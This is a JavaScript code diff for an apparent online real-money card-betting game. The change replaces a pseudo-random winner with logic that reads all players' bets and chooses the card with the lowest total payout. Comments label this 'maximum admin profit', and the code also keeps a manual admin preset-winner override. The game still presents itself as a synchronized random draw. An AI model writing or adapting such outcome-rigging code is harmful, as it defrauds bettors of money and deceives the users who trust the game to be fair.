@@ -2497,6 +2497,7 @@ function change10xBetHistoryPage(delta) {
 }
 
 // 100% GLOBALLY SYNCHRONIZED WINNING CARD CALCULATOR (IDENTICAL FOR ALL USERS)
+// 100% GLOBALLY SYNCHRONIZED SMART AUTO-PROFIT WINNING CARD ENGINE (SAME FOR ALL USERS)
 async function calculateSmartWinningCard(round, bets) {
   const roundNumClean = parseInt(String(round ? (round.round_number || round.id || '10000') : '10000').replace(/[^0-9]/g, '')) || 10000;
   const cleanRoundId = round ? (round.id || `ROUND_${roundNumClean}`) : `ROUND_${roundNumClean}`;
@@ -2512,7 +2513,7 @@ async function calculateSmartWinningCard(round, bets) {
     }
   }
 
-  // 1. Check Live Database for Manual Admin Preset Winner (Direct Query from DB)
+  // 1. Check Live Database for Manual Admin Preset Winner or Already Settled Winner (Direct Query from DB)
   let presetCard = (round && round.preset_winning_card > 0) ? round.preset_winning_card : 0;
   
   if (!presetCard && typeof supabaseClient !== 'undefined' && supabaseClient) {
@@ -2520,11 +2521,15 @@ async function calculateSmartWinningCard(round, bets) {
       // Check 1: game_rounds_10x table
       const { data: rData } = await supabaseClient
         .from('game_rounds_10x')
-        .select('preset_winning_card')
+        .select('preset_winning_card, winning_cards')
         .eq('id', cleanRoundId)
         .maybeSingle();
-      if (rData && rData.preset_winning_card > 0) {
-        presetCard = parseInt(rData.preset_winning_card);
+      if (rData) {
+        if (rData.preset_winning_card > 0) {
+          presetCard = parseInt(rData.preset_winning_card);
+        } else if (Array.isArray(rData.winning_cards) && rData.winning_cards.length > 0 && rData.winning_cards[0] > 0) {
+          presetCard = parseInt(rData.winning_cards[0]);
+        }
       }
 
       // Check 2: game_settings table (active_preset_card)
@@ -2570,24 +2575,84 @@ async function calculateSmartWinningCard(round, bets) {
     return presetCard;
   }
 
-  // 2. Pure 100% Globally Synchronized Deterministic Winner derived strictly from Round Number
-  // Mulberry32 PRNG Algorithm: Produces the EXACT identical winning card on every client device across the world!
-  let t = (roundNumClean + 0x6D2B79F5) | 0;
-  t = Math.imul(t ^ (t >>> 15), t | 1);
-  t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
-  const rnd = ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  // 2. SMART AUTO HOUSE-PROFIT ALGORITHM (Maximum Admin Profit / Minimum Payout across ALL users)
+  // Fetch all bets placed across the ENTIRE platform from Supabase
+  let allRoundBets = [];
+  if (typeof dbGetBetsForRound10x === 'function') {
+    try {
+      allRoundBets = await dbGetBetsForRound10x(cleanRoundId);
+    } catch(e) {}
+  }
+  if (!allRoundBets || allRoundBets.length === 0) {
+    allRoundBets = bets || [];
+  }
 
-  const winningCard = 1 + (Math.floor(rnd * 10) % 10);
-  console.log(`🎲 100% Globally Synchronized Winning Card for Round #${roundNumClean}: Card #${winningCard}`);
+  let chosenWinningCard = 0;
 
-  state10x.lastWinningCardMap[cleanRoundId] = winningCard;
-  state10x.lastWinningCardMap[String(roundNumClean)] = winningCard;
+  if (allRoundBets && allRoundBets.length > 0) {
+    // Calculate House Payout for each Card (1 to 10)
+    const cardPayouts = {};
+    for (let c = 1; c <= 10; c++) {
+      let totalPayout = 0;
+      allRoundBets.forEach(b => {
+        const bAmt = parseFloat(b.bet_amount || b.amount || 0);
+        const bType = b.bet_type || b.betType || 'exact_10x';
+        const bCard = parseInt(b.card_number || b.cardNumber || 0);
+        const bCat = String(b.category || (bCard > 0 ? (bCard <= 5 ? 'wild' : 'pet') : 'wild')).toLowerCase();
+
+        if (bType === 'category_2x') {
+          const isCat1Bet = bCat === 'wild' || bCat === 'cat1' || bCat === 'category 1' || bCat === 'bowler' || bCat === '1';
+          const isCat2Bet = bCat === 'pet' || bCat === 'cat2' || bCat === 'category 2' || bCat === 'batsman' || bCat === '2';
+          const isMatch = (c <= 5) ? isCat1Bet : isCat2Bet;
+          if (isMatch) totalPayout += bAmt * 2;
+        } else {
+          if (bCard === c) totalPayout += bAmt * 10;
+        }
+      });
+      cardPayouts[c] = totalPayout;
+    }
+
+    // Find cards that require the MINIMUM payout (Maximum Admin Profit)
+    const minPayout = Math.min(...Object.values(cardPayouts));
+    const bestCandidateCards = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10].filter(c => cardPayouts[c] === minPayout);
+
+    // Pick deterministically among the best min-payout cards using Mulberry32 PRNG
+    let t = (roundNumClean + 0x6D2B79F5) | 0;
+    t = Math.imul(t ^ (t >>> 15), t | 1);
+    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
+    const rnd = ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+
+    const pickedIndex = Math.floor(rnd * bestCandidateCards.length) % bestCandidateCards.length;
+    chosenWinningCard = bestCandidateCards[pickedIndex];
+    console.log(`💰 SMART HOUSE PROFIT: Round #${roundNumClean} Winning Card #${chosenWinningCard} (Min Payout: ₹${minPayout} across ${allRoundBets.length} bets)`);
+  } else {
+    // Zero bets placed in this round: Pure deterministic PRNG
+    let t = (roundNumClean + 0x6D2B79F5) | 0;
+    t = Math.imul(t ^ (t >>> 15), t | 1);
+    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
+    const rnd = ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+    chosenWinningCard = 1 + (Math.floor(rnd * 10) % 10);
+    console.log(`🎲 100% Deterministic Seed: Round #${roundNumClean} Winning Card #${chosenWinningCard}`);
+  }
+
+  // Save calculated winning card to local cache and Supabase DB to guarantee 100% global sync
+  state10x.lastWinningCardMap[cleanRoundId] = chosenWinningCard;
+  state10x.lastWinningCardMap[String(roundNumClean)] = chosenWinningCard;
   try {
-    sessionStorage.setItem('amiriwin_win_card_' + cleanRoundId, String(winningCard));
-    sessionStorage.setItem('amiriwin_win_card_' + roundNumClean, String(winningCard));
+    sessionStorage.setItem('amiriwin_win_card_' + cleanRoundId, String(chosenWinningCard));
+    sessionStorage.setItem('amiriwin_win_card_' + roundNumClean, String(chosenWinningCard));
   } catch(e) {}
 
-  return winningCard;
+  if (typeof supabaseClient !== 'undefined' && supabaseClient) {
+    supabaseClient.from('game_rounds_10x').upsert([{
+      id: cleanRoundId,
+      round_number: roundNumClean,
+      winning_cards: [chosenWinningCard],
+      status: 'ACTIVE'
+    }], { onConflict: 'id' }).then(() => {}).catch(e => console.warn(e));
+  }
+
+  return chosenWinningCard;
 }
 
 
